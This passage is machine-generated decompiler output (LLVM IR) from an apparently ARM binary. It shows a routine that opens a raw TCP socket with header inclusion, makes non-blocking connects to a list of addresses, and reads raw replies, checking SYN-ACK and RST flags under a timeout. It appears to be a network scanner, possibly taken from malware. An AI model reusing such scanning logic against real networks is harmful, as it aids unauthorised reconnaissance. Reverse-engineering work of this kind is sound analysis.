  uselistorder label %.thread8, { 2, 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %dec_label_pc_ace0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ac18, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_abac, { 1, 0 }
  uselistorder label %dec_label_pc_aaf8, { 1, 0 }
}

define i32 @function_b100(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b100:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp39 = call i8 @__decompiler_undefined_function_1()
  %tmp40 = call i8 @__decompiler_undefined_function_1()
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_b100 = load i32, i32* @r4, align 4
  %v1_b104 = urem i32 %arg1, 256
  store i32 %v1_b104, i32* @fp, align 4
  store i32 %v1_b104, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b11c = urem i32 %arg3, 256
  store i32 %v1_b11c, i32* @r4, align 4
  %v2_b120 = call i32* @calloc(i32 %v1_b104, i32 16)
  %v4_b120 = ptrtoint i32* %v2_b120 to i32
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b12c = load i32, i32* @fp, align 4
  store i32 %v0_b12c, i32* %r0.global-to-local, align 4
  %v2_b130 = call i32* @calloc(i32 %v0_b12c, i32 4)
  %v4_b130 = ptrtoint i32* %v2_b130 to i32
  %v0_b134 = load i32, i32* @r5, align 4
  store i32 %v0_b134, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b144 = load i32, i32* @r4, align 4
  store i32 %v0_b144, i32* %r0.global-to-local, align 4
  %v5_b148 = inttoptr i32 %v0_b134 to i32*
  %v6_b148 = call i32 @function_930c(i32 %v0_b144, i32* %v5_b148, i32 2, i32 0, i32 %v4_b130)
  %v1_b154 = urem i32 %v6_b148, 256
  store i32 %v1_b154, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b160 = load i32, i32* @r5, align 4
  store i32 %v0_b160, i32* %r1.global-to-local, align 4
  %v0_b164 = load i32, i32* @r4, align 4
  store i32 %v0_b164, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_b148, 16777216
  %v5_b16c = sdiv i32 %sext, 16777216
  %v6_b16c = inttoptr i32 %v0_b160 to i32*
  %v7_b16c = call i32 @function_930c(i32 %v0_b164, i32* %v6_b16c, i32 3, i32 65535, i32 %v5_b16c)
  %v0_b170 = load i32, i32* @r5, align 4
  store i32 %v0_b170, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b16c, i32* @r6, align 4
  %v0_b180 = load i32, i32* @r4, align 4
  store i32 %v0_b180, i32* %r0.global-to-local, align 4
  %v5_b184 = inttoptr i32 %v0_b170 to i32*
  %v6_b184 = call i32 @function_930c(i32 %v0_b180, i32* %v5_b184, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_b18c = urem i32 %v6_b184, 256
  store i32 %v1_b18c, i32* %ip.global-to-local, align 4
  %v0_b190 = load i32, i32* @r5, align 4
  store i32 %v0_b190, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b19c = load i32, i32* @r4, align 4
  store i32 %v0_b19c, i32* %r0.global-to-local, align 4
  %sext9 = mul i32 %v6_b184, 16777216
  %v5_b1a4 = sdiv i32 %sext9, 16777216
  %v6_b1a4 = inttoptr i32 %v0_b190 to i32*
  %v7_b1a4 = call i32 @function_930c(i32 %v0_b19c, i32* %v6_b1a4, i32 5, i32 1, i32 %v5_b1a4)
  %v1_b1b0 = urem i32 %v7_b1a4, 256
  store i32 %v1_b1b0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b1b8 = load i32, i32* @r5, align 4
  store i32 %v0_b1b8, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b1c0 = load i32, i32* @r4, align 4
  store i32 %v0_b1c0, i32* %r0.global-to-local, align 4
  %v5_b1c8 = inttoptr i32 %v0_b1b8 to i32*
  %v6_b1c8 = call i32 @function_930c(i32 %v0_b1c0, i32* %v5_b1c8, i32 7, i32 65535, i32 %v1_b1b0)
  %v0_b1cc = load i32, i32* @r5, align 4
  store i32 %v0_b1cc, i32* %r1.global-to-local, align 4
  %v3_b1d0 = mul i32 %v6_b1c8, 65536
  store i32 %v3_b1d0, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b1dc = load i32, i32* @r4, align 4
  store i32 %v0_b1dc, i32* %r0.global-to-local, align 4
  %v5_b1e0 = inttoptr i32 %v0_b1cc to i32*
  %v6_b1e0 = call i32 @function_930c(i32 %v0_b1dc, i32* %v5_b1e0, i32 11, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_b1e8 = urem i32 %v6_b1e0, 256
  store i32 %v1_b1e8, i32* %ip.global-to-local, align 4
  %v0_b1ec = load i32, i32* @r5, align 4
  store i32 %v0_b1ec, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b1f8 = load i32, i32* @r4, align 4
  store i32 %v0_b1f8, i32* %r0.global-to-local, align 4
  %v5_b200 = inttoptr i32 %v0_b1ec to i32*
  %v6_b200 = call i32 @function_930c(i32 %v0_b1f8, i32* %v5_b200, i32 12, i32 1, i32 %v1_b1e8)
  %v1_b208 = urem i32 %v6_b200, 256
  store i32 %v1_b208, i32* %ip.global-to-local, align 4
  %v0_b20c = load i32, i32* @r5, align 4
  store i32 %v0_b20c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b218 = load i32, i32* @r4, align 4
  store i32 %v0_b218, i32* %r0.global-to-local, align 4
  %v5_b220 = inttoptr i32 %v0_b20c to i32*
  %v6_b220 = call i32 @function_930c(i32 %v0_b218, i32* %v5_b220, i32 13, i32 1, i32 %v1_b208)
  %v1_b228 = urem i32 %v6_b220, 256
  store i32 %v1_b228, i32* %ip.global-to-local, align 4
  %v0_b22c = load i32, i32* @r5, align 4
  store i32 %v0_b22c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b238 = load i32, i32* @r4, align 4
  store i32 %v0_b238, i32* %r0.global-to-local, align 4
  %v5_b240 = inttoptr i32 %v0_b22c to i32*
  %v6_b240 = call i32 @function_930c(i32 %v0_b238, i32* %v5_b240, i32 14, i32 0, i32 %v1_b228)
  %v1_b248 = urem i32 %v6_b240, 256
  store i32 %v1_b248, i32* %ip.global-to-local, align 4
  %v0_b24c = load i32, i32* @r5, align 4
  store i32 %v0_b24c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b258 = load i32, i32* @r4, align 4
  store i32 %v0_b258, i32* %r0.global-to-local, align 4
  %v5_b260 = inttoptr i32 %v0_b24c to i32*
  %v6_b260 = call i32 @function_930c(i32 %v0_b258, i32* %v5_b260, i32 15, i32 0, i32 %v1_b248)
  %v1_b268 = urem i32 %v6_b260, 256
  store i32 %v1_b268, i32* %ip.global-to-local, align 4
  %v0_b26c = load i32, i32* @r5, align 4
  store i32 %v0_b26c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b278 = load i32, i32* @r4, align 4
  store i32 %v0_b278, i32* %r0.global-to-local, align 4
  %v5_b280 = inttoptr i32 %v0_b26c to i32*
  %v6_b280 = call i32 @function_930c(i32 %v0_b278, i32* %v5_b280, i32 16, i32 0, i32 %v1_b268)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_b280, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b290 = load i32, i32* @r5, align 4
  store i32 %v0_b290, i32* %r1.global-to-local, align 4
  %v0_b294 = load i32, i32* @r4, align 4
  store i32 %v0_b294, i32* %r0.global-to-local, align 4
  %v1_b298 = urem i32 %v6_b280, 256
  store i32 %v1_b298, i32* @r8, align 4
  %v5_b29c = inttoptr i32 %v0_b290 to i32*
  %v6_b29c = call i32 @function_930c(i32 %v0_b294, i32* %v5_b29c, i32 0, i32 768, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b2a8 = load i32, i32* @r5, align 4
  store i32 %v0_b2a8, i32* %r1.global-to-local, align 4
  store i32 %v6_b29c, i32* @sb, align 4
  %v0_b2b0 = load i32, i32* @r4, align 4
  store i32 %v0_b2b0, i32* %r0.global-to-local, align 4
  %v5_b2b4 = inttoptr i32 %v0_b2a8 to i32*
  %v6_b2b4 = call i32 @function_930c(i32 %v0_b2b0, i32* %v5_b2b4, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_b2c0 = urem i32 %v6_b2b4, 256
  store i32 %v1_b2c0, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b2d0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b2d0, i32* %r0.global-to-local, align 4
  %v0_b2d4 = load i32, i32* @r7, align 4
  %v3_b2d4 = udiv i32 %v0_b2d4, 65536
  store i32 %v3_b2d4, i32* %r1.global-to-local, align 4
  %v2_b2d8 = icmp eq i32 %v3_b2d0, -1
  store i1 %v2_b2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b2d8, label %dec_label_pc_b55c, label %dec_label_pc_b2e8

dec_label_pc_b2e8:                                ; preds = %dec_label_pc_b100
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b2f0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b2f0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_b304 = call i32 @setsockopt(i32 %v3_b2d0, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_b304, i32* %r0.global-to-local, align 4
  %v2_b308 = icmp eq i32 %v7_b304, -1
  store i1 %v2_b308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b308, label %dec_label_pc_b554, label %dec_label_pc_b310

dec_label_pc_b310:                                ; preds = %dec_label_pc_b2e8
  %v0_b310 = load i32, i32* @fp, align 4
  %v2_b310 = icmp eq i32 %v0_b310, 0
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  %v0_b314 = load i32, i32* @r6, align 4
  %v3_b314 = mul i32 %v0_b314, 65536
  store i32 %v3_b314, i32* %r0.global-to-local, align 4
  %v3_b318 = urem i32 %v0_b314, 65536
  store i32 %v3_b318, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp84 = icmp slt i32 %v0_b310, 1
  br i1 %tmp84, label %.thread26, label %dec_label_pc_b33c.preheader

.thread26:                                        ; preds = %dec_label_pc_b310
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_b7dc

dec_label_pc_b33c.preheader:                      ; preds = %dec_label_pc_b310
  %v5_b320 = load i32, i32* @r7, align 4
  %v8_b320 = udiv i32 %v5_b320, 16777216
  %tmp85 = udiv i32 %v0_b314, 256
  %v8_b324 = urem i32 %tmp85, 256
  store i32 %v8_b324, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_b348 = urem i32 %v0_b314, 256
  %v3_b434 = icmp ugt i32 %v0_b2d4, -65537
  %v2_b458 = ptrtoint i32* %stack_var_-60 to i32
  %tmp86 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v4_b474 = mul nuw nsw i32 %v1_b348, 256
  %v5_b474 = or i32 %v8_b324, %v4_b474
  %sext10 = mul i32 %tmp85, 16777216
  %v4_b480 = sdiv i32 %sext10, 16777216
  %v3_b488 = ashr i32 %sext10, 31
  %tmp87 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v2_b4b8 = ptrtoint i32* %stack_var_-332 to i32
  %v2_b4bc = ptrtoint i32* %stack_var_-44 to i32
  %v4_b504 = zext i8 %tmp40 to i32
  %v4_b508 = zext i8 %tmp39 to i32
  %v4_b514 = mul nuw nsw i32 %v4_b508, 256
  %v4_b524 = zext i8 %tmp to i32
  %v1_b528 = and i32 %v4_b524, 18
  %v2_b52c = icmp eq i32 %v1_b528, 18
  %v1_b444 = mul nuw nsw i32 %v3_b2d4, 256
  %v4_b448 = and i32 %v1_b444, 65280
  %v5_b448 = or i32 %v8_b320, %v4_b448
  %v3_b44c112 = udiv i32 %v4_b448, 256
  %v1_b450 = trunc i32 %v3_b44c112 to i8
  %v5_b514 = or i32 %v4_b504, %v4_b514
  %v1_b534 = and i32 %v4_b524, 5
  %v2_b534 = icmp eq i32 %v1_b534, 0
  %v1_b454 = trunc i32 %v8_b320 to i8
  %v1_b660 = trunc i32 %v5_b16c to i8
  %v1_b72c = urem i32 %v6_b1e0, 2
  %tmp113 = sub nsw i32 0, %v1_b72c
  %v4_b734 = and i32 %tmp113, 32
  %v1_b744 = urem i32 %v6_b200, 2
  %tmp114 = sub nsw i32 0, %v1_b744
  %v4_b74c = and i32 %tmp114, 16
  %v1_b75c = urem i32 %v6_b220, 2
  %tmp115 = sub nsw i32 0, %v1_b75c
  %v4_b764 = and i32 %tmp115, 8
  %v1_b774 = urem i32 %v6_b240, 2
  %tmp116 = sub nsw i32 0, %v1_b774
  %v4_b77c = and i32 %tmp116, 4
  %v1_b78c = urem i32 %v6_b260, 2
  %tmp117 = sub nsw i32 0, %v1_b78c
  %v3_b794 = and i32 %tmp117, 2
  br label %dec_label_pc_b33c

dec_label_pc_b33c:                                ; preds = %dec_label_pc_b7c8, %dec_label_pc_b53c, %dec_label_pc_b33c.preheader
  store i32 %v8_b324, i32* %r3.global-to-local, align 4
  store i32 %v1_b348, i32* %ip.global-to-local, align 4
  %v0_b354 = load i32, i32* @sb, align 4
  %v1_b354 = add i32 %v0_b354, 40
  store i32 %v1_b354, i32* @sl, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b364106 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b364106, i32* %r0.global-to-local, align 4
  %v2_b368107 = icmp eq i32 %v3_b364106, -1
  store i1 %v2_b368107, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b364106, i32* @r7, align 4
  br i1 %v2_b368107, label %dec_label_pc_b7c8, label %dec_label_pc_b374

dec_label_pc_b374:                                ; preds = %dec_label_pc_b33c, %dec_label_pc_b548
  %v3_b364108 = phi i32 [ %v3_b364, %dec_label_pc_b548 ], [ %v3_b364106, %dec_label_pc_b33c ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b37c = call i32 (i32, i32, ...) @fcntl(i32 %v3_b364108, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b384 = or i32 %v2_b37c, 2048
  store i32 %v1_b384, i32* %r2.global-to-local, align 4
  %v0_b388 = load i32, i32* @r7, align 4
  store i32 %v0_b388, i32* %r0.global-to-local, align 4
  %v2_b38c = call i32 (i32, i32, ...) @fcntl(i32 %v0_b388, i32 4)
  %v3_b390 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b390, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v5_b3ac = mul i32 %v3_b390, 24
  store i32 %v5_b3ac, i32* %r1.global-to-local, align 4
  %v2_b3b0 = add i32 %v5_b3ac, %arg2
  store i32 %v2_b3b0, i32* %r2.global-to-local, align 4
  %v1_b3b4 = add i32 %v2_b3b0, 20
  %v2_b3b4 = inttoptr i32 %v1_b3b4 to i8*
  %v3_b3b4 = load i8, i8* %v2_b3b4, align 1
  %v4_b3b4 = zext i8 %v3_b3b4 to i32
  store i32 %v4_b3b4, i32* %r3.global-to-local, align 4
  %v2_b3b8 = icmp ugt i8 %v3_b3b4, 30
  %v7_b3b8 = icmp eq i8 %v3_b3b4, 31
  store i1 %v7_b3b8, i1* %cpsr_z.global-to-local, align 1
  %v2_b3bc = xor i1 %v7_b3b8, true
  %v3_b3bc = and i1 %v2_b3b8, %v2_b3bc
  %v5_b3bc = add i32 %v2_b3b0, 16
  %v6_b3bc = inttoptr i32 %v5_b3bc to i32*
  %v7_b3bc = load i32, i32* %v6_b3bc, align 4
  br i1 %v3_b3bc, label %dec_label_pc_b428, label %dec_label_pc_b3c8

dec_label_pc_b3c8:                                ; preds = %dec_label_pc_b374
  store i32 %v7_b3bc, i32* %r4.global-to-local, align 4
  %v0_b3cc = call i32 @function_f6c4()
  store i32 %v0_b3cc, i32* %r0.global-to-local, align 4
  %v3_b3d0 = load i32, i32* %stack_var_-40, align 4
  %v5_b3d8 = mul i32 %v3_b3d0, 24
  %v2_b3e4 = add i32 %v5_b3d8, %arg2
  store i32 %v2_b3e4, i32* %r1.global-to-local, align 4
  %v1_b3e0 = udiv i32 %v7_b3bc, 256
  %v3_b3e8 = and i32 %v1_b3e0, 65280
  store i32 %v3_b3e8, i32* %r2.global-to-local, align 4
  %v1_b3ec = and i32 %v7_b3bc, 65280
  store i32 %v1_b3ec, i32* %r3.global-to-local, align 4
  %v3_b3f0 = mul i32 %v7_b3bc, 16777216
  store i32 %v3_b3f0, i32* %ip.global-to-local, align 4
  %v1_b3f4 = add i32 %v2_b3e4, 20
  %v2_b3f4 = inttoptr i32 %v1_b3f4 to i8*
  %v3_b3f4 = load i8, i8* %v2_b3f4, align 1
  %v4_b3f4 = zext i8 %v3_b3f4 to i32
  store i32 %v4_b3f4, i32* %lr.global-to-local, align 4
  %v4_b3f8 = mul nuw nsw i32 %v1_b3ec, 256
  %v5_b3f8 = or i32 %v4_b3f8, %v3_b3f0
  store i32 %v5_b3f8, i32* %ip.global-to-local, align 4
  %v2_b400 = call i32 @llvm.bswap.i32(i32 %v7_b3bc)
  %v7_b404 = lshr i32 %v0_b3cc, %v4_b3f4
  %v8_b404 = add i32 %v7_b404, %v2_b400
  store i32 %v8_b404, i32* %r2.global-to-local, align 4
  %v3_b410 = mul i32 %v8_b404, 16777216
  %v1_b414 = and i32 %v8_b404, 65280
  store i32 %v1_b414, i32* %r0.global-to-local, align 4
  %v4_b418 = mul nuw nsw i32 %v1_b414, 256
  %v5_b418 = or i32 %v4_b418, %v3_b410
  store i32 %v5_b418, i32* %r1.global-to-local, align 4
  %v2_b420 = call i32 @llvm.bswap.i32(i32 %v8_b404)
  br label %dec_label_pc_b428

dec_label_pc_b428:                                ; preds = %dec_label_pc_b374, %dec_label_pc_b3c8
  %storemerge34 = phi i32 [ %v2_b420, %dec_label_pc_b3c8 ], [ %v7_b3bc, %dec_label_pc_b374 ]
  store i32 %v3_b2d4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_b434, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b434, label %dec_label_pc_b564, label %dec_label_pc_b43c

dec_label_pc_b43c:                                ; preds = %dec_label_pc_b428
  store i32 %v3_b2d4, i32* %r0.global-to-local, align 4
  store i32 %v8_b320, i32* %r1.global-to-local, align 4
  store i32 %v5_b448, i32* %r3.global-to-local, align 4
  store i32 %v3_b44c112, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b458

dec_label_pc_b458:                                ; preds = %dec_label_pc_b564, %dec_label_pc_b43c
  %stack_var_-57.0 = phi i8 [ %v1_b56c, %dec_label_pc_b564 ], [ %v1_b450, %dec_label_pc_b43c ]
  %storemerge = phi i8 [ %v1_b564, %dec_label_pc_b564 ], [ %v1_b454, %dec_label_pc_b43c ]
  store i32 %v2_b458, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b460 = load i32, i32* @r7, align 4
  store i32 %v0_b460, i32* %r0.global-to-local, align 4
  %v5_b464 = call i32 @connect(i32 %v0_b460, %sockaddr* nonnull %tmp86, i32 16)
  store i32 %v1_b348, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v5_b474, i32* %r2.global-to-local, align 4
  %v2_b47c = call i32 @time(i32* null)
  store i32 %v2_b47c, i32* %r0.global-to-local, align 4
  store i32 %v2_b47c, i32* %r4.global-to-local, align 4
  store i32 %v3_b488, i32* %ip.global-to-local, align 4
  %v9_b4e8 = icmp eq i32 %tmp41, %storemerge34
  %v4_b50c = zext i8 %storemerge to i32
  %v4_b510 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_b4e8 to i32
  %v9_b4fc = icmp eq i1 %v9_b4e8, false
  %v4_b518 = mul nuw nsw i32 %v4_b510, 256
  %v5_b518 = or i32 %v4_b518, %v4_b50c
  %v9_b51c = icmp eq i32 %v5_b518, %v5_b514
  br label %dec_label_pc_b4a4

dec_label_pc_b494:                                ; preds = %.thread32, %dec_label_pc_b504, %dec_label_pc_b534, %bb89
  %v2_b494 = call i32 @time(i32* null)
  %v0_b498 = load i32, i32* %r4.global-to-local, align 4
  %v2_b498 = sub i32 %v2_b494, %v0_b498
  store i32 %v2_b498, i32* %r0.global-to-local, align 4
  %v7_b49c = icmp eq i32 %v2_b498, 10
  store i1 %v7_b49c, i1* %cpsr_z.global-to-local, align 1
  %v8_b4a0 = icmp sgt i32 %v2_b498, 10
  br i1 %v8_b4a0, label %dec_label_pc_b548, label %dec_label_pc_b4a4

dec_label_pc_b4a4:                                ; preds = %dec_label_pc_b494, %dec_label_pc_b458
  store i32 16, i32* %stack_var_-44, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b4b8, i32* %r1.global-to-local, align 4
  store i32 %v2_b4bc, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_b2d0, i32* %r0.global-to-local, align 4
  %v10_b4cc = call i32 @recvfrom(i32 %v3_b2d0, i32* nonnull %stack_var_-332, i32 256, i32 16384, %sockaddr* %tmp87, i32* nonnull %stack_var_-44)
  store i32 %v10_b4cc, i32* %r2.global-to-local, align 4
  %v2_b4d4 = icmp eq i32 %v10_b4cc, -1
  store i1 %v2_b4d4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_b4d4, label %dec_label_pc_b55c, label %dec_label_pc_b4e0

dec_label_pc_b4e0:                                ; preds = %dec_label_pc_b4a4
  store i32 %storemerge34, i32* %lr.global-to-local, align 4
  store i32 %tmp41, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_b4f4 = icmp eq i32 %v10_b4cc, 40
  store i1 %v7_b4f4, i1* %cpsr_z.global-to-local, align 1
  %tmp118 = icmp ult i32 %v10_b4cc, 41
  br i1 %tmp118, label %.thread32, label %bb89

.thread32:                                        ; preds = %dec_label_pc_b4e0
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b494

bb89:                                             ; preds = %dec_label_pc_b4e0
  store i1 %v9_b4fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4fc, label %dec_label_pc_b494, label %dec_label_pc_b504

dec_label_pc_b504:                                ; preds = %bb89
  store i32 %v4_b508, i32* %r1.global-to-local, align 4
  store i32 %v4_b50c, i32* %ip.global-to-local, align 4
  store i32 %v4_b510, i32* %r2.global-to-local, align 4
  store i32 %v5_b514, i32* %r3.global-to-local, align 4
  store i32 %v5_b518, i32* @r5, align 4
  store i1 %v9_b51c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b51c, label %dec_label_pc_b524, label %dec_label_pc_b494

dec_label_pc_b524:                                ; preds = %dec_label_pc_b504
  store i32 %v4_b524, i32* %r2.global-to-local, align 4
  store i32 %v1_b528, i32* %r3.global-to-local, align 4
  store i1 %v2_b52c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b52c, label %dec_label_pc_b578, label %dec_label_pc_b534

dec_label_pc_b534:                                ; preds = %dec_label_pc_b524
  store i1 %v2_b534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b534, label %dec_label_pc_b494, label %dec_label_pc_b53c

dec_label_pc_b53c:                                ; preds = %dec_label_pc_b534
  %v0_b53c = load i32, i32* @r7, align 4
  store i32 %v0_b53c, i32* %r0.global-to-local, align 4
  %v1_b540 = call i32 @close(i32 %v0_b53c)
  store i32 %v1_b540, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b33c

dec_label_pc_b548:                                ; preds = %dec_label_pc_b494
  %v0_b548 = load i32, i32* @r7, align 4
  store i32 %v0_b548, i32* %r0.global-to-local, align 4
  %v1_b54c = call i32 @close(i32 %v0_b548)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b364 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b364, i32* %r0.global-to-local, align 4
  %v2_b368 = icmp eq i32 %v3_b364, -1
  store i1 %v2_b368, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b364, i32* @r7, align 4
  br i1 %v2_b368, label %dec_label_pc_b7c8, label %dec_label_pc_b374

dec_label_pc_b554:                                ; preds = %dec_label_pc_b2e8
  store i32 %v3_b2d0, i32* %r0.global-to-local, align 4
  %v1_b558 = call i32 @close(i32 %v3_b2d0)
  store i32 %v1_b558, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b55c

dec_label_pc_b55c:                                ; preds = %dec_label_pc_b4a4, %dec_label_pc_b100, %dec_label_pc_b554
  %v29_b560 = phi i32 [ -1, %dec_label_pc_b100 ], [ %v1_b558, %dec_label_pc_b554 ], [ 0, %dec_label_pc_b4a4 ]
  store i32 %v3_b100, i32* %r4.global-to-local, align 4
  ret i32 %v29_b560

dec_label_pc_b564:                                ; preds = %dec_label_pc_b428
  %v0_b564 = call i32 @function_f6c4()
  %v1_b564 = trunc i32 %v0_b564 to i8
  store i32 %v0_b564, i32* %r0.global-to-local, align 4
  %v4_b568 = sdiv i32 %v0_b564, 256
  store i32 %v4_b568, i32* %r3.global-to-local, align 4
  %v1_b56c = trunc i32 %v4_b568 to i8
  br label %dec_label_pc_b458

dec_label_pc_b578:                                ; preds = %dec_label_pc_b524
  %v3_b578 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b578, i32* %r4.global-to-local, align 4
  store i32 %v4_b120, i32* %r2.global-to-local, align 4
  %v3_b580 = mul i32 %v3_b578, 16
  store i32 %v3_b580, i32* %ip.global-to-local, align 4
  %v3_b584 = add i32 %v3_b580, %v4_b120
  %v4_b584 = inttoptr i32 %v3_b584 to i32*
  store i32 %storemerge34, i32* %v4_b584, align 4
  %v0_b588 = load i32, i32* @r6, align 4
  %v1_b588 = add i32 %v0_b588, 4
  %v2_b588 = inttoptr i32 %v1_b588 to i32*
  %v3_b588 = load i32, i32* %v2_b588, align 4
  %v1_b594 = and i32 %v3_b588, 65280
  store i32 %v1_b594, i32* %r1.global-to-local, align 4
  %v3_b598 = mul i32 %v3_b588, 16777216
  store i32 %v4_b120, i32* %r0.global-to-local, align 4
  %v4_b5a4 = mul nuw nsw i32 %v1_b594, 256
  %v5_b5a4 = or i32 %v4_b5a4, %v3_b598
  store i32 %v5_b5a4, i32* %r2.global-to-local, align 4
  %v1_b5a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b5a8 = add i32 %v1_b5a8, %v4_b120
  store i32 %v2_b5a8, i32* %ip.global-to-local, align 4
  %v2_b5ac = call i32 @llvm.bswap.i32(i32 %v3_b588)
  store i32 %v2_b5ac, i32* %r3.global-to-local, align 4
  %v2_b5b0 = add i32 %v2_b5a8, 4
  %v3_b5b0 = inttoptr i32 %v2_b5b0 to i32*
  store i32 %v2_b5ac, i32* %v3_b5b0, align 4
  %v0_b5b4 = load i32, i32* @r6, align 4
  %v1_b5b4 = add i32 %v0_b5b4, 8
  %v2_b5b4 = inttoptr i32 %v1_b5b4 to i32*
  %v3_b5b4 = load i32, i32* %v2_b5b4, align 4
